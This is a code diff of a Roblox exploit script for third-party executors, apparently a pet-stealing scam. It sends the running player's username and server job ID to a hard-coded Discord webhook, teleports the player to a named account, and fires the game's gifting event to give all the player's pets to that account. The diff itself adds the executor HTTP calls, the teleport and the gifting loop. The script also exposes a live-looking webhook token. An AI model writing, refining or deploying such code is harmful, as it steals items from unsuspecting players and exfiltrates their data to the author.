@@ -1,13 +1,11 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local webhookURL = "https://discord.com/api/webhooks/1378046230868787361/Ny2d9ikOTh5c3PXSTMOAT8FK4h7hIKIZ9duNOrqVqdA3AnDj04b13SSkB9GC9RzUIT9a"  -- <-- Put your webhook URL here
+local webhookURL = "https://discord.com/api/webhooks/1378046230868787361/Ny2d9ikOTh5c3PXSTMOAT8FK4h7hIKIZ9duNOrqVqdA3AnDj04b13SSkB9GC9RzUIT9a"  -- Replace with your webhook
 local adminUsername = "connor24377_10"
 local localPlayer = Players.LocalPlayer
 local backpack = localPlayer:WaitForChild("Backpack")
-local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-local giftPetEvent = ReplicatedStorage:WaitForChild("GiftPet")
+local petGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
 local adminPlayer = Players:FindFirstChild(adminUsername)
 if not adminPlayer then
@@ -15,63 +13,75 @@ if not adminPlayer then
 	return
 end
 
--- Send data to webhook
+local adminChar = adminPlayer.Character
+if not adminChar or not adminChar:FindFirstChild("HumanoidRootPart") then
+	warn("Admin character or HumanoidRootPart not found")
+	return
+end
+
+local localChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local hrp = localChar:WaitForChild("HumanoidRootPart")
+
+-- Use executor's HTTP request function (adjust for your executor)
 local function sendWebhook()
 	local data = {
 		username = localPlayer.Name,
 		serverJobId = game.JobId
 	}
-
-	local payload = HttpService:JSONEncode(data)
 	
-	-- Discord webhook payload formatting
-	local discordPayload = HttpService:JSONEncode({
-		content = "Player executed script",
+	local payload = {
+		content = "Script executed by player!",
 		embeds = {{
-			title = "Script Executed",
+			title = "Script Execution Alert",
 			fields = {
 				{name = "Username", value = data.username, inline = true},
 				{name = "Server Job ID", value = data.serverJobId, inline = true},
 			},
 			color = 65280
 		}}
-	})
+	}
 	
-	local success, err = pcall(function()
-		HttpService:PostAsync(webhookURL, discordPayload, Enum.HttpContentType.ApplicationJson)
-	end)
+	local jsonPayload = game:GetService("HttpService"):JSONEncode(payload)
 	
-	if not success then
-		warn("Failed to send webhook:", err)
+	-- Try common executor requests:
+	
+	-- For Synapse X:
+	if syn and syn.request then
+		syn.request({
+			Url = webhookURL,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = jsonPayload
+		})
+		return
 	end
+	
+	-- For KRNL:
+	if request then
+		request({
+			Url = webhookURL,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = jsonPayload
+		})
+		return
+	end
+	
+	-- If none available, warn user:
+	warn("No supported HTTP request function found in executor.")
 end
 
-local function equipTool(tool)
-	local humanoid = character:FindFirstChildOfClass("Humanoid")
-	if humanoid and tool and tool.Parent and (tool.Parent == backpack or tool.Parent == character) then
-		humanoid:EquipTool(tool)
-	end
-end
-
-local function giftAllFrom(container)
-	for _, item in ipairs(container:GetChildren()) do
-		if item:IsA("Tool") or item:IsA("Model") then
-			equipTool(item)
-			wait(0.3)
-			if giftPetEvent then
-				giftPetEvent:FireServer("GivePet", adminPlayer)
-			end
-			wait(0.3)
-		end
-	end
-end
-
--- Send webhook once on execution
 sendWebhook()
 
--- Loop gifting to admin every 10 seconds (adjust timing as needed)
-while true do
-	giftAllFrom(backpack)
-	giftAllFrom(character)
-	wait(10)
+-- Teleport local player to admin
+hrp.CFrame = adminChar.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0)
+
+wait(1)
+
+-- Gift all pets to admin
+for _, pet in ipairs(backpack:GetChildren()) do
+	if pet:IsA("Tool") or pet:IsA("Model") then
+		petGiftEvent:FireServer("GivePet", adminPlayer)
+		wait(0.3)
+	end
 end
